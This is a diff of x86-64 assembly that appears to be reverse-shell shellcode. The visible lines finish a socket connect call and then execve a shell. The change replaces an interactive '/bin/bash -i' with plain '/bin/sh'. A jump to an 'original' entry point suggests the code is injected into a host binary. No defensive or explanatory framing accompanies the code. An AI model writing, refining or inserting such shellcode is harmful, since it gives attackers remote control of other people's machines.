@@ -47,13 +47,11 @@ _start:
     mov rdx, 16 ; socklen = 16
     syscall
 
-    ; execve("/bin/bash", ["/bin/bash", "-i", null], null)
+    ; execve("/bin/sh", ["/bin/sh", null], null)
     xor rax, rax
-    push rax ; argv[2] = null
-    lea rax, [rel flag] 
-    push rax ; argv[1] = "-i"
+    push rax ; argv[1] = null
     lea rdi, [rel path]
-    push rdi ; argv[0] = "/bin/bash"
+    push rdi ; argv[0] = "/bin/sh"
     mov rsi, rsp
     xor rdx, rdx
     mov rax, 59 ; sys_execve = 59
@@ -71,11 +69,8 @@ original:
     jmp rax
 
 text:
-    db "is it dead beef or steak", 0Ah
+    db "is it dead beef or steak", 0x0A
 
 path:
-    db "/bin/bash", 0
-
-flag:
-    db "-i", 0
+    db "/bin/sh", 0
 
